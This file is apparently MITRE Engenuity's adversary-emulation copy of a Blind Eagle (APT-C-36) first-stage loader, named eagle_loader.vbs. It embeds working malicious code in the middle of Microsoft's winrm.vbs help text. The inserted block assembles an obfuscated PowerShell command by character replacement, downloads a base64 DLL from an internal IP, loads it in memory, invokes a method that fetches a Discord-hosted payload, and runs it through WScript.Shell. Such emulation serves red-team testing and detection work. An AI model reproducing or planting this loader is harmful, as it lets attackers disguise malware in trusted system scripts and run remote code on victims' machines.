'eagle_loader.vbs
   '    About:
   '        The first stage loader is usually named with a double extension: IE Asuntos DIAN ... .pdf.vbs
   '        The loader will call the windows script host (WScript.Shell) and download the second stage (fiber.dll)
   '        The loader does this by building a string and replacing characters to form the proper PowerShell commands
   '        The loader is placed in the middle of a legitimate looking winrm.vbs file
   '    Returns:
   '        No return
   '    MITRE ATT&CK Techniques:
   '        T1059.005 Command and Scripting Interpreter Visual Basic
   '        T1059.003 Command and Scripting Interpreter Windows Command Shell
   '        T1059.001 Command and Scripting Interpreter PowerShell
   '        T1132.001 Data Encoding: Standard Encoding
   '        T1140 Deobfuscate/Decode files for informations    
   '    CTI:
   '        https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia
   '        https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/
   '    License:
   '        © 2023 MITRE Engenuity, LLC. Approved for Public Release. Document number CT0076
   '        Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0
'
' Copyright (c) Microsoft Corporation.  All rights reserved.
'
' VBScript Source File
'
' Script Name: winrm.vbs
'



'''''''''''''''''''''
' Error codes
private const ERR_OK              = 0
private const ERR_GENERAL_FAILURE = 1

' Messages
private const L_ONLYCSCRIPT_Message     = "Can be executed only by cscript.exe."
private const L_UNKOPNM_Message         = "Unknown operation name: "
private const L_OP_Message              = "Operation - "
private const L_NOFILE_Message          = "File does not exist: "
private const L_PARZERO_Message         = "Parameter is zero length #"
private const L_INVOPT_ErrorMessage     = "Switch not allowed with the given operation: "
private const L_UNKOPT_ErrorMessage     = "Unknown switch: "
private const L_BLANKOPT_ErrorMessage   = "Missing switch name"
private const L_UNKOPT_GenMessage       = "Invalid use of command line. Type ""winrm -?"" for help."
private const L_HELP_GenMessage         = "Type ""winrm -?"" for help."
private const L_ScriptNameNotFound_ErrorMessage = "Invalid usage of command line; winrm.vbs not found in command string."
private const L_ImproperUseOfQuotes_ErrorMessage = "A quoted parameter value must begin and end with quotes: "
private const L_BADMATCNT1_Message      = "Unexpected match count - one match is expected: "
private const L_OPTNOTUNQ_Message       = "Option is not unique: "
private const L_URIMISSING_Message      = "URI is missing"
private const L_ACTIONMISSING_Message   = "Action is missing"
private const L_URIZERO_Message         = "URI is 0 length"    
private const L_URIZEROTOK_Message      = "Invalid URI, token is 0 length"    
private const L_INVWMIURI1_Message      = "Invalid WMI resource URI - no '/' found  (at least 2 expected)"
private const L_INVWMIURI2_Message      = "Invalid WMI resource URI - only one '/' found (at least 2 expected)"
private const L_NOLASTTOK_Message       = "Invalid URI - cannot locate last token for root node name"
private const L_HashSyntax_ErrorMessage = "Syntax Error: input must be of the form {KEY=""VALUE""[;KEY=""VALUE""]}"
private const L_ARGNOVAL_Message        = "Argument's value is not provided: "
private const L_XMLERROR_Message        = "Unable to parse XML: "
private const L_XSLERROR_Message        = "Unable to parse XSL file. Either it is inaccessible or invalid: "
private const L_MSXML6MISSING_Message   = "Unable to load MSXML6, required by -format option and for set using ""@{...}"""
private const L_FORMATLERROR_Message    = "Invalid option for -format: "
private const L_FORMATFAILED_Message    = "Unable to reformat message. Raw, unformatted, message: "
private const L_PUT_PARAM_NOMATCH_Message = "Parameter name does not match any properties on resource: "
private const L_PUT_PARAM_MULTIMATCH_Message = "Parameter matches more than one property on resource: "
private const L_PUT_PARAM_NOARRAY_Message = "Multiple matching parameter names not allowedin @{...}: "
private const L_PUT_PARAM_NOTATTR_Message = "Parameter matches a non-text property on resource: "
private const L_PUT_PARAM_EMPTY_Message = "Parameter set is empty."
private const L_OPTIONS_PARAMETER_EMPTY_Message = "Options parameter has no value or is malformed."
private const L_RESOURCELOCATOR_Message = "Unable to create ResourceLocator object."
private const L_PUT_PARAM_NOINPUT_Message = "No input provided through ""@{...}"" or ""-file:"" commandline parameters."
private const L_ERR_Message = "Error: "
private const L_ERRNO_Message = "Error number: "
private const L_OpDoesntAcceptInput_ErrorMessage = "Input was supplied to an operation that does not accept input."
private const L_QuickConfigNoChangesNeeded_Message = "WinRM is already set up for remote management on this computer."
private const L_QuickConfig_MissingUpdateXml_0_ErrorMessage = "Could not find update instructions in analysis result."
private const L_QuickConfigUpdated_Message = "WinRM has been updated for remote management."
private const L_QuickConfigUpdateFailed_ErrorMessage = "One or more update steps could not be completed."
private const L_QuickConfig_InvalidBool_0_ErrorMessage = "Could not determine if remoting is enabled."
private const L_QuickConfig_RemotingDisabledbyGP_00_ErrorMessage = "Cannot complete the request due to a conflicting Group Policy setting."
private const L_QuickConfig_UpdatesNeeded_0_Message = "WinRM is not set up to allow remote access to this machine for management."
private const L_QuickConfig_UpdatesNeeded_1_Message = "The following changes must be made:"
private const L_QuickConfig_Prompt_0_Message = "Make these changes [y/n]? "
private const L_QuickConfigNoServiceChangesNeeded_Message = "WinRM is already set up to receive requests on this computer."
private const L_QuickConfigNoServiceChangesNeeded_Message2 = "WinRM service is already running on this machine."
private const L_QuickConfigUpdatedService_Message = "WinRM has been updated to receive requests."
private const L_QuickConfig_ServiceUpdatesNeeded_0_Message = "WinRM is not set up to receive requests on this machine."


'''''''''''''''''''''
' HELP - GENERAL
private const L_Help_Title_0_Message = "Windows Remote Management Command Line Tool"

private const L_Help_Blank_0_Message = ""

private const L_Help_SeeAlso_Title_Message    = "See also:"
private const X_Help_SeeAlso_Aliases_Message  = "  winrm help aliases"
private const X_Help_SeeAlso_Config_Message   = "  winrm help config"
private const X_Help_SeeAlso_CertMapping_Message  = "  winrm help certmapping"
private const X_Help_SeeAlso_CustomRemoteShell_Message    = "  winrm help customremoteshell"
private const X_Help_SeeAlso_Input_Message    = "  winrm help input"
private const X_Help_SeeAlso_Filters_Message  = "  winrm help filters"
private const X_Help_SeeAlso_Switches_Message = "  winrm help switches"
private const X_Help_SeeAlso_Uris_Message     = "  winrm help uris"
private const X_Help_SeeAlso_Auth_Message     = "  winrm help auth"
private const X_Help_SeeAlso_Set_Message      = "  winrm set -?"
private const X_Help_SeeAlso_Create_Message   = "  winrm create -?"
private const X_Help_SeeAlso_Enumerate_Message   = "  winrm enumerate -?"
private const X_Help_SeeAlso_Invoke_Message   = "  winrm invoke -?"
private const X_Help_SeeAlso_Remoting_Message = "  winrm help remoting"
private const X_Help_SeeAlso_configSDDL_Message = "  winrm configsddl -?"


'''''''''''''''''''''
' HELP - HELP
private const L_HelpHelp_000_0_Message = "Windows Remote Management (WinRM) is the Microsoft implementation of "
private const L_HelpHelp_001_0_Message = "the WS-Management protocol which provides a secure way to communicate "
private const L_HelpHelp_001_1_Message = "with local and remote computers using web services.  "
private const L_HelpHelp_002_0_Message = ""
private const L_HelpHelp_003_0_Message = "Usage:"
private const L_HelpHelp_004_0_Message = "  winrm OPERATION RESOURCE_URI [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpHelp_005_0_Message = "        [@{KEY=VALUE[;KEY=VALUE]...}]"
private const L_HelpHelp_007_0_Message = ""
private const L_HelpHelp_008_0_Message = "For help on a specific operation:"
private const L_HelpHelp_009_0_Message = "  winrm g[et] -?        Retrieving management information."
private const L_HelpHelp_010_0_Message = "  winrm s[et] -?        Modifying management information."
private const L_HelpHelp_011_0_Message = "  winrm c[reate] -?     Creating new instances of management resources."
private const L_HelpHelp_012_0_Message = "  winrm d[elete] -?     Remove an instance of a management resource."
private const L_HelpHelp_013_0_Message = "  winrm e[numerate] -?  List all instances of a management resource."
private const L_HelpHelp_014_0_Message = "  winrm i[nvoke] -?     Executes a method on a management resource."
private const L_HelpHelp_015_0_Message = "  winrm id[entify] -?   Determines if a WS-Management implementation is"
private const L_HelpHelp_015_1_Message = "                        running on the remote machine."
private const L_HelpHelp_016_0_Message = "  winrm quickconfig -?  Configures this machine to accept WS-Management"
private const L_HelpHelp_016_1_Message = "                        requests from other machines."
private const L_HelpHelp_016_3_Message = "  winrm configSDDL -?   Modify an existing security descriptor for a URI."
private const L_HelpHelp_016_4_Message = "  winrm helpmsg -?      Displays error message for the error code."
private const L_HelpHelp_017_0_Message = ""
private const L_HelpHelp_018_0_Message = "For help on related topics:"
private const L_HelpHelp_019_0_Message = "  winrm help uris       How to construct resource URIs."
private const L_HelpHelp_020_0_Message = "  winrm help aliases    Abbreviations for URIs."
private const L_HelpHelp_021_0_Message = "  winrm help config     Configuring WinRM client and service settings."
private const L_HelpHelp_021_2_Message = "  winrm help certmapping Configuring client certificate access."
private const L_HelpHelp_022_0_Message = "  winrm help remoting   How to access remote machines."
private const L_HelpHelp_023_0_Message = "  winrm help auth       Providing credentials for remote access."
private const L_HelpHelp_024_0_Message = "  winrm help input      Providing input to create, set, and invoke."
private const L_HelpHelp_025_0_Message = "  winrm help switches   Other switches such as formatting, options, etc."
private const L_HelpHelp_026_0_Message = "  winrm help proxy      Providing proxy information."

'''''''''''''''''''''
' HELP - GET
private const L_HelpGet_000_0_Message = "winrm get RESOURCE_URI [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpGet_001_0_Message = ""
private const L_HelpGet_002_0_Message = "Retrieves instances of RESOURCE_URI using specified "
private const L_HelpGet_003_0_Message = "options and key-value pairs."
private const L_HelpGet_004_0_Message = ""
private const L_HelpGet_005_0_Message = "Example: Retrieve current configuration in XML format:"
private const X_HelpGet_006_0_Message = "  winrm get winrm/config -format:pretty"
private const L_HelpGet_007_0_Message = ""
private const L_HelpGet_008_0_Message = "Example: Retrieve spooler instance of Win32_Service class:"
private const X_HelpGet_009_0_Message = "  winrm get wmicimv2/Win32_Service?Name=spooler"
private const L_HelpGet_010_0_Message = ""
private const L_HelpGet_014_0_Message = "Example: Retrieve a certmapping entry on this machine:"
private const X_HelpGet_015_0_Message = "  winrm get winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935301923+Subject=*.example.com+URI=wmicimv2/*"
private const L_HelpGet_016_0_Message = ""

'''''''''''''''''''''
' HELP - SET
private const L_HelpSet_001_0_Message = "winrm set RESOURCE_URI [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpSet_002_0_Message = "          [@{KEY=""VALUE""[;KEY=""VALUE""]}]"
private const L_HelpSet_003_0_Message = "          [-file:VALUE]"
private const L_HelpSet_004_0_Message = ""
private const L_HelpSet_005_0_Message = "Modifies settings in RESOURCE_URI using specified switches"
private const L_HelpSet_006_0_Message = "and input of changed values via key-value pairs or updated "
private const L_HelpSet_007_0_Message = "object via an input file."
private const L_HelpSet_008_0_Message = ""
private const L_HelpSet_009_0_Message = "Example: Modify a configuration property of WinRM:"
private const X_HelpSet_010_0_Message = "  winrm set winrm/config @{MaxEnvelopeSizekb=""100""}"
private const L_HelpSet_011_0_Message = ""
private const L_HelpSet_012_0_Message = "Example: Disable a listener on this machine:"
private const X_HelpSet_013_0_Message = "  winrm set winrm/config/Listener?Address=*+Transport=HTTPS @{Enabled=""false""}"
private const L_HelpSet_014_0_Message = ""
private const L_HelpSet_018_0_Message = "Example: Disable a certmapping entry on this machine:"
private const X_HelpSet_019_0_Message = "  Winrm set winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935301923+Subject=*.example.com+URI=wmicimv2/* @{Enabled=""false""}"
private const L_HelpSet_020_0_Message = ""

'''''''''''''''''''''
' HELP - CREATE
private const L_HelpCreate_001_0_Message = "winrm create RESOURCE_URI [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpCreate_002_0_Message = "             [@{KEY=""VALUE""[;KEY=""VALUE""]}]"
private const L_HelpCreate_003_0_Message = "             [-file:VALUE]"
private const L_HelpCreate_004_0_Message = ""
private const L_HelpCreate_005_0_Message = "Spawns an instance of RESOURCE_URI using specified "
private const L_HelpCreate_006_0_Message = "key-value pairs or input file."
private const L_HelpCreate_007_0_Message = ""
private const L_HelpCreate_008_0_Message = "Example: Create instance of HTTP Listener on IPv6 address:"
private const X_HelpCreate_009_0_Message = "  winrm create winrm/config/Listener?Address=IP:3ffe:8311:ffff:f2c1::5e61+Transport=HTTP"
private const L_HelpCreate_010_0_Message = ""
private const L_HelpCreate_011_0_Message = "Example: Create instance of HTTPS Listener on all IPs:"
private const X_HelpCreate_012_0_Message = "  winrm create winrm/config/Listener?Address=*+Transport=HTTPS @{Hostname=""HOST"";CertificateThumbprint=""XXXXXXXXXX""}"
private const L_HelpCreate_013_0_Message = "Note: XXXXXXXXXX represents a 40-digit hex string; see help config."
private const L_HelpCreate_014_0_Message = ""
private const L_HelpCreate_015_0_Message = "Example: Create a windows shell command instance from xml:"
private const X_HelpCreate_016_0_Message = "  winrm create shell/cmd -file:shell.xml -remote:srv.corp.com"
private const L_HelpCreate_017_0_Message = ""
private const L_HelpCreate_022_0_Message = "Example: Create a CertMapping entry:"
private const X_HelpCreate_023_0_Message = "  winrm create winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935301923+Subject=*.example.com+URI=wmicimv2/* @{UserName=""USERNAME"";Password=""PASSWORD""} -remote:localhost"
private const L_HelpCreate_024_0_Message = ""


'''''''''''''''''''''
' HELP - DELETE
private const L_HelpDelete_001_0_Message = "winrm delete RESOURCE_URI [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpDelete_002_0_Message = ""
private const L_HelpDelete_003_0_Message = "Removes an instance of RESOURCE_URI."
private const L_HelpDelete_004_0_Message = ""
private const L_HelpDelete_005_0_Message = "Example: delete the HTTP listener on this machine for given IP address:"
private const X_HelpDelete_006_0_Message = "  winrm delete winrm/config/Listener?Address=IP:192.168.2.1+Transport=HTTP"
private const L_HelpDelete_007_0_Message = ""
private const L_HelpDelete_008_0_Message = "Example: delete a certmapping entry:"
private const X_HelpDelete_009_0_Message = "  winrm delete winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935301923+Subject=*.example.com+URI=wmicimv2/*"
private const L_HelpDelete_010_0_Message = ""

'''''''''''''''''''''
' HELP - ENUMERATE
private const L_HelpEnum_001_0_Message = "winrm enumerate RESOURCE_URI [-ReturnType:Value] [-Shallow]" 
private const L_HelpEnum_001_1_Message = "         [-BasePropertiesOnly] [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpEnum_002_0_Message = ""
private const L_HelpEnum_003_0_Message = "Lists instances of RESOURCE_URI."
private const L_HelpEnum_004_0_Message = "Can limit the instances returned by using a filter and dialect if the "
private const L_HelpEnum_005_0_Message = "resource supports these."
private const L_HelpEnum_006_0_Message = ""
private const L_HelpEnum_006_1_Message = "ReturnType"
private const L_HelpEnum_006_2_Message = "----------"
private const L_HelpEnum_006_3_Message = "returnType is an optional switch that determines the type of data returned."
private const L_HelpEnum_006_4_Message = "Possible options are 'Object', 'EPR'  and 'ObjectAndEPR'. Default is Object"
private const L_HelpEnum_006_5_Message = "If Object is specified or if switch is omitted, then only the objects are"
private const L_HelpEnum_006_6_Message = "returned."
private const L_HelpEnum_006_7_Message = "If EPR is specified, then only the EPRs (End point reference) of the"
private const L_HelpEnum_006_8_Message = "objects are returned. EPRs contain information about the resource URI and"
private const L_HelpEnum_006_9_Message = "selectors for the instance."
private const L_HelpEnum_006_10_Message = "If ObjectAndEPR is specified, then both the object and the associated EPRs"
private const L_HelpEnum_006_11_Message = "are returned."
private const L_HelpEnum_006_12_Message = ""
private const L_HelpEnum_006_13_Message = "Shallow"
private const L_HelpEnum_006_14_Message = "-------"
private const L_HelpEnum_006_15_Message = "Enumerate only instances of the base class specified in the resource URI."
private const L_HelpEnum_006_16_Message = "If this flag is not specified, instances of the base class specified in "
private const L_HelpEnum_006_17_Message = "the resource URI and all its derived classes are returned."
private const L_HelpEnum_006_18_Message = ""
private const L_HelpEnum_006_19_Message = "BasePropertiesOnly"
private const L_HelpEnum_006_20_Message = "------------------"
private const L_HelpEnum_006_21_Message = "Includes only those properties that are part of the base class specified"
private const L_HelpEnum_006_22_Message = "in the resource URI. When -Shallow is specified, this flag has no effect. "
private const L_HelpEnum_006_23_Message = ""
private const L_HelpEnum_007_0_Message = "Example: List all WinRM listeners on this machine:"
private const X_HelpEnum_008_0_Message = "  winrm enumerate winrm/config/Listener"
private const L_HelpEnum_009_0_Message = ""
private const L_HelpEnum_010_0_Message = "Example: List all instances of Win32_Service class:"
private const X_HelpEnum_011_0_Message = "  winrm enumerate wmicimv2/Win32_Service"
private const L_HelpEnum_012_0_Message = ""
'private const L_HelpEnum_013_0_Message = "Example: List all auto start services that are stopped:"
'private const X_HelpEnum_014_0_Message = "  winrm enum wmicimv2/* -filter:""select * from win32_service where StartMode=\""Auto\"" and State = \""Stopped\"" """
'private const L_HelpEnum_015_0_Message = ""
private const L_HelpEnum_016_0_Message = "Example: List all shell instances on a machine:"
private const X_HelpEnum_017_0_Message = "  winrm enum shell/cmd -remote:srv.corp.com"
private const L_HelpEnum_018_0_Message = ""
private const L_HelpEnum_019_0_Message = "Example: List resources accessible to the current user:"
private const X_HelpEnum_020_0_Message = "  winrm enum winrm/config/resource"
private const L_HelpEnum_021_0_Message = ""
private const L_HelpEnum_022_0_Message = "Example: List all certmapping settings:"
private const X_HelpEnum_023_0_Message = "  winrm enum winrm/config/service/certmapping"
private const L_HelpEnum_024_0_Message = ""

'''''''''''''''''''''
' HELP - INVOKE
private const L_HelpInvoke_001_0_Message = "winrm invoke ACTION RESOURCE_URI [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpInvoke_002_0_Message = "             [@{KEY=""VALUE""[;KEY=""VALUE""]}]"
private const L_HelpInvoke_003_0_Message = "             [-file:VALUE]"
private const L_HelpInvoke_004_0_Message = ""
private const L_HelpInvoke_005_0_Message = "Executes method specified by ACTION on target object specified by RESOURCE_URI"
private const L_HelpInvoke_006_0_Message = "with parameters specified by key-value pairs."
private const L_HelpInvoke_007_0_Message = ""
private const L_HelpInvoke_008_0_Message = "Example: Call StartService method on Spooler service:"
private const X_HelpInvoke_009_0_Message = "  winrm invoke StartService wmicimv2/Win32_Service?Name=spooler"
private const L_HelpInvoke_010_0_Message = ""
private const L_HelpInvoke_011_0_Message = "Example: Call StopService method on Spooler service using XML file:"
private const X_HelpInvoke_012_0_Message = "  winrm invoke StopService wmicimv2/Win32_Service?Name=spooler -file:input.xml"
private const L_HelpInvoke_013_0_Message = "Where input.xml:"
private const X_HelpInvoke_014_0_Message = "<p:StopService_INPUT xmlns:p=""http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Service""/>"
private const L_HelpInvoke_015_0_Message = ""
private const L_HelpInvoke_016_0_Message = "Example: Call Create method of Win32_Process class with specified parameters:"
private const X_HelpInvoke_017_0_Message = "  winrm invoke Create wmicimv2/Win32_Process @{CommandLine=""notepad.exe"";CurrentDirectory=""C:\""}"
private const L_HelpInvoke_018_0_Message = ""
private const L_HelpInvoke_019_0_Message = "Example: Restore the default winrm configuration:"
private const L_HelpInvoke_019_1_Message = "Note that this will not restore the default winrm plugin configuration:"
private const X_HelpInvoke_020_0_Message = "  winrm invoke restore winrm/config @{}"
private const L_HelpInvoke_021_0_Message = ""
private const L_HelpInvoke_022_0_Message = "Example: Restore the default winrm plugin configuration:"
private const L_HelpInvoke_022_1_Message = "Note that all external plugins will be unregistered during this operation:"
private const X_HelpInvoke_023_0_Message = "  winrm invoke restore winrm/config/plugin @{}"

'''''''''''''''''''''
' HELP - IDENTIFY
private const X_HelpIdentify_001_0_Message = "winrm identify  [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpIdentify_003_0_Message = ""
private const L_HelpIdentify_004_0_Message = "Issues an operation against a remote machine to see if the WS-Management "
private const L_HelpIdentify_005_0_Message = "service is running. This operation must be run with the '-remote' switch."
private const L_HelpIdentify_006_0_Message = "To run this operation unauthenticated against the remote machine use the"
private const L_HelpIdentify_007_0_Message = "-auth:none"
private const L_HelpIdentify_008_0_Message = ""
private const L_HelpIdentify_009_0_Message = "Example: identify if WS-Management is running on www.example.com:"
private const X_HelpIdentify_010_0_Message = "  winrm identify -remote:www.example.com"


'''''''''''''''''''''
' HELP - HELPMSG
private const X_HelpHelpMessaage_001_0_Message = "winrm helpmsg errorcode"
private const X_HelpHelpMessaage_002_0_Message = ""
private const X_HelpHelpMessaage_003_0_Message = "Displays error message associate with the error code."
private const X_HelpHelpMessaage_004_0_Message = "Example:"
private const X_HelpHelpMessaage_006_0_Message = "  winrm helpmsg 0x5"
   ' Create varaibles for the strings associated with command
   ' Command ends up being: 
   ' powershell.exe [Byte[]] $rOWg = [system.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString(http://172.16.1.5/dll/new_rump_vb.net.txt));[System.AppDomain]::CurrentDomain.Load($rOWg).GetType('Fiber.Home').GetMethod('VAI').Invoke($null, [object[]]) ('https://cdn.discordapp.com/attachments/<number>/asy.txt'))
   Set WWUP = WScript.CreateObject("WScript.Shell")
    dim bIUv , hsPd ,zhXc ,ZfiH ,hrHK ,CIQKZHH ,UWGWaLq ,cDqeUhv ,UUkXaLU ,bIUv0
    bIUv = "powøø*�rshøø*�ll.øø*�xøø*� [Bytøø*�[]] $rOWg = [systøø*�m.Convøø*�rt]::FromBasøø*�64string((Nøø*�w-Objøø*�ct Nøø*�t.Wøø*�bCli"
    bIUv = Replace(bIUv,"øø*�","e")
    hsPd = "∞∞↓únt).D�▲→^wnl�▲→^ad"
    hsPd = Replace(hsPd,"�▲→^","o")
    hsPd = Replace(hsPd,"∞∞↓ú","e")
    zhXc = "StrПø4*n"
    zhXc = Replace(zhXc,"Пø4*","i")
    ZfiH = "◀◀4�('"
    ZfiH = Replace(ZfiH,"◀◀4�","g")
    hrHK = "http://192.168.0.5/dll/new_rump_vb.net.txt" ' fiber.dll payload
    CIQKZHH = "'));[Systøú@@*(@m.A#(4ð(∞(#(4ð(∞(D"
    CIQKZHH = Replace(CIQKZHH,"#(4ð(∞(","p")
    CIQKZHH = Replace(CIQKZHH,"øú@@*(@","e")
    UWGWaLq = "▲ú@(ø@+main]::Curr44☝░@4�ntD▲ú@(ø@+main.L▲ú@(ø@+ad($r"
    UWGWaLq = Replace(UWGWaLq,"44☝░@4�","e")
    UWGWaLq = Replace(UWGWaLq,"▲ú@(ø@+","o")
    cDqeUhv = "OWg).G44☝░@4�tTyp44☝░@4�('fib44☝░@4�r.Hom"
    cDqeUhv = Replace(cDqeUhv,"44☝░@4�","e")
    UUkXaLU = "e').G44☝░@4�tM44☝░@4�thod('VAI').Invok44☝░@4�($null, [obj44☝░@4�ct[]] ('ø☀☞√�}П�◀@+@░�@@ø☀☞√�}П�.ysa4*●*☞#:▶5.0.86](∞ú(.(úø(@@*ú9](∞ú(4*●*☞#:▶4*●*☞#:▶▶☟ð}↓→+◀pø☀☞√�}П�ø☀☞√�}П�↓*(▲☟@*⇝'))" ' The Discord CDN URL is rebuilt in fiber.dlls VAI method
    UUkXaLU = Replace(UUkXaLU,"44☝░@4�","e")
    bIUv0 = bIUv + hsPd + zhXc + ZfiH + hrHK + CIQKZHH + UWGWaLq + cDqeUhv + UUkXaLU
    WWUP.Run("%comspec% /c " + bIUv0), false
    WScript.Quit

private const L_HelpAlias_001_0_Message = "Aliasing allows shortcuts to be used in place of full Resource URIs."
private const L_HelpAlias_002_0_Message = "Available aliases and the Resource URIs they substitute for are:"
private const L_HelpAlias_003_0_Message = ""
private const X_HelpAlias_004_0_Message = "wmi      = http://schemas.microsoft.com/wbem/wsman/1/wmi"
private const X_HelpAlias_005_0_Message = "wmicimv2 = http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2"
private const X_HelpAlias_006_0_Message = "cimv2    = http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2"
private const X_HelpAlias_007_0_Message = "winrm    = http://schemas.microsoft.com/wbem/wsman/1"
private const X_HelpAlias_008_0_Message = "wsman    = http://schemas.microsoft.com/wbem/wsman/1"
private const X_HelpAlias_009_0_Message = "shell    = http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
private const L_HelpAlias_010_0_Message = ""
private const L_HelpAlias_011_0_Message = "Example: using full Resource URI:"
private const x_HelpAlias_012_0_Message = "  winrm get http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Service?Name=WinRM"
private const L_HelpAlias_013_0_Message = ""
private const L_HelpAlias_014_0_Message = "Example: using alias:"
private const X_HelpAlias_015_0_Message = "  winrm get wmicimv2/Win32_Service?Name=WinRM"

'''''''''''''''''''''
' HELP - URIS
private const L_HelpUris_001_0_Message = "Universal Resource Identifiers (URI) specify management resources to be"
private const L_HelpUris_002_0_Message = "used for operations."
private const L_HelpUris_003_0_Message = ""
private const L_HelpUris_004_0_Message = "Selectors and values are passed after the URI in the form:"
private const X_HelpUris_005_0_Message = "  RESOURCE_URI?NAME=VALUE[+NAME=VALUE]..."
private const L_HelpUris_006_0_Message = ""
private const L_HelpUris_007_0_Message = "URIs for all information in WMI are of the following form:"
private const X_HelpUris_008_0_Message = "  WMI path = \\root\NAMESPACE[\NAMESPACE]\CLASS"
private const X_HelpUris_009_0_Message = "  URI      = http://schemas.microsoft.com/wbem/wsman/1/wmi/root/NAMESPACE[/NAMESPACE]/CLASS"
private const X_HelpUris_010_0_Message = "  ALIAS    = wmi/root/NAMESPACE[/NAMESPACE]/CLASS"
private const L_HelpUris_011_0_Message = ""
private const L_HelpUris_012_0_Message = "Example: Get information about WinRM service from WMI using single selector"
private const X_HelpUris_013_0_Message = "  WMI path = \\root\cimv2\Win32_Service"
private const X_HelpUris_013_1_Message = "  URI      = http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Service?Name=WinRM"
private const X_HelpUris_014_0_Message = "  ALIAS    = wmi/root/cimv2/Win32_Service?Name=WinRM"
private const L_HelpUris_015_0_Message = ""
private const L_HelpUris_015_1_Message = "When enumerating WMI instances using a WQL filter,"
private const L_HelpUris_015_2_Message = "the CLASS must be ""*"" (star) and no selectors should be specified."
private const L_HelpUris_015_3_Message = "Example:"
private const X_HelpUris_015_4_Message = "URI = http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/*"
private const L_HelpUris_015_5_Message = ""
private const L_HelpUris_015_6_Message = "When accesing WMI singleton instances, no selectors should be specified."
private const L_HelpUris_015_7_Message = "Example:"
private const X_HelpUris_015_8_Message = "URI = http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Service"
private const L_HelpUris_015_9_Message = ""
private const L_HelpUris_016_0_Message = "Note: Some parts of RESOURCE_URI may be case-sensitive. When using create or"
private const L_HelpUris_017_0_Message = "invoke, the last part of the resource URI must match case-wise the top-level"
private const L_HelpUris_018_0_Message = "element of the expected XML."

'''''''''''''''''''''
' HELP - CONFIG
private const L_HelpConfig_001_0_Message = "Configuration for WinRM is managed using the winrm command line or through GPO."
private const L_HelpConfig_002_0_Message = "Configuration includes global configuration for both the client and service."
private const L_HelpConfig_003_0_Message = ""
private const L_HelpConfig_004_0_Message = "The WinRM service requires at least one listener to indicate the IP address(es)"
private const L_HelpConfig_005_0_Message = "on which to accept WS-Management requests.  For example, if the machine has "
private const L_HelpConfig_006_0_Message = "multiple network cards, WinRM can be configured to only accept requests from"
private const L_HelpConfig_007_0_Message = "one of the network cards."
private const L_HelpConfig_008_0_Message = ""
private const L_HelpConfig_009_0_Message = "Global configuration"
private const X_HelpConfig_010_0_Message = "  winrm get winrm/config"
private const X_HelpConfig_011_0_Message = "  winrm get winrm/config/client"
private const X_HelpConfig_012_0_Message = "  winrm get winrm/config/service"
private const X_HelpConfig_012_1_Message = "  winrm enumerate winrm/config/resource"
private const X_HelpConfig_012_2_Message = "  winrm enumerate winrm/config/listener"
private const X_HelpConfig_012_3_Message = "  winrm enumerate winrm/config/plugin"
private const X_HelpConfig_012_4_Message = "  winrm enumerate winrm/config/service/certmapping"
private const L_HelpConfig_013_0_Message = ""
private const L_HelpConfig_014_0_Message = "Network listening requires one or more listeners.  "
private const L_HelpConfig_015_0_Message = "Listeners are identified by two selectors: Address and Transport."

private const L_HelpConfigAddress_001_0_Message = "Address must be one of:"
private const L_HelpConfigAddress_002_0_Message = "  *           - Listen on all IPs on the machine "
private const L_HelpConfigAddress_003_0_Message = "  IP:1.2.3.4  - Listen only on the specified IP address"
private const L_HelpConfigAddress_004_0_Message = "  MAC:...     - Listen only on IP address for the specified MAC"
private const L_HelpConfigAddress_005_0_Message = ""
private const L_HelpConfigAddress_006_0_Message = "Note: All listening is subject to the IPv4Filter and IPv6Filter under    "
private const L_HelpConfigAddress_007_0_Message = "config/service."
private const L_HelpConfigAddress_008_0_Message = "Note: IP may be an IPv4 or IPv6 address."

private const L_HelpConfigTransport_001_0_Message = "Transport must be one of:"
private const L_HelpConfigTransport_002_0_Message = "  HTTP  - Listen for requests on HTTP  (default port is 5985)"
private const L_HelpConfigTransport_003_0_Message = "  HTTPS - Listen for requests on HTTPS (default port is 5986)"
private const L_HelpConfigTransport_004_0_Message = ""
private const L_HelpConfigTransport_005_0_Message = "Note: HTTP traffic by default only allows messages encrypted with "
private const L_HelpConfigTransport_006_0_Message = "the Negotiate or Kerberos SSP."
private const L_HelpConfigTransport_007_0_Message = ""
private const L_HelpConfigTransport_008_0_Message = ""
private const L_HelpConfigTransport_009_0_Message = "When configuring HTTPS, the following properties are used:"
private const L_HelpConfigTransport_010_0_Message = "  Hostname - Name of this machine; must match CN in certificate."
private const L_HelpConfigTransport_011_0_Message = "  CertificateThumbprint - hexadecimal thumbprint of certificate appropriate for"
private const L_HelpConfigTransport_012_0_Message = "    Server Authentication."
private const L_HelpConfigTransport_013_0_Message = "Note: If only Hostname is supplied, WinRM will try to find an appropriate"
private const L_HelpConfigTransport_014_0_Message = "certificate."
   
private const L_HelpConfigExamples_001_0_Message = "Example: To listen for requests on HTTP on all IPs on the machine:"
